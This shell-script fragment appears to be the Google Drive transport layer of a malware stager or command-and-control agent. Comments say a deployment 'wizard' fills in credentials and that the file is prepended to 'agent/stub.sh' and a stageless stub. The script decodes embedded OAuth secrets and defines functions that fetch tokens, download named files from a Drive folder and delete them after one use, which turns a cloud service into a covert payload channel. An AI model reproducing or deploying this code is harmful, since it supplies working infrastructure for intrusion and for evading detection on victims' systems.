# === TRANSPORT: Google Drive API v3 (stub layer) ===
# Provides _tk (get token), _dl (download), _rm (delete).
# Files addressed by name within FOLDER_ID.
# Credentials substituted by wizard at deploy time.
# This file is prepended to agent/stub.sh and agent/stub_stageless.sh.

_ci=$(printf '%s' 'STUB_CLIENT_ID_B64'     | base64 -d 2>/dev/null)
_cs=$(printf '%s' 'STUB_CLIENT_SECRET_B64'  | base64 -d 2>/dev/null)
_rt=$(printf '%s' 'STUB_REFRESH_TOKEN_B64'  | base64 -d 2>/dev/null)
_fi=$(printf '%s' 'STUB_FOLDER_ID_B64'      | base64 -d 2>/dev/null)

# -- get access token --
_tk() {
    curl -sf -X POST "https://oauth2.googleapis.com/token" \
        -d "grant_type=refresh_token&refresh_token=${_rt}&client_id=${_ci}&client_secret=${_cs}" \
        2>/dev/null | grep -o '"access_token":"[^"]*"' | grep -o '"[^"]*"$' | tr -d '"'
}

# -- resolve file ID by name in folder --
_fid() {
    local _q="name%3D%27${1}%27+and+%27${_fi}%27+in+parents+and+trashed%3Dfalse"
    curl -sf "https://www.googleapis.com/drive/v3/files?q=${_q}&fields=files%28id%29" \
        -H "Authorization: Bearer ${2}" 2>/dev/null \
        | sed -n 's/.*"id"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1
}

# -- download file to stdout --
_dl() {
    local _n="${2##*/}" _id
    _id=$(_fid "$_n" "$1")
    [ -n "$_id" ] && curl -sf "https://www.googleapis.com/drive/v3/files/${_id}?alt=media" \
        -H "Authorization: Bearer ${1}" 2>/dev/null
}

# -- delete file (BK one-time use) --
_rm() {
    local _n="${2##*/}" _id
    _id=$(_fid "$_n" "$1")
    [ -n "$_id" ] && curl -sf -X DELETE "https://www.googleapis.com/drive/v3/files/${_id}" \
        -H "Authorization: Bearer ${1}" >/dev/null 2>&1
}
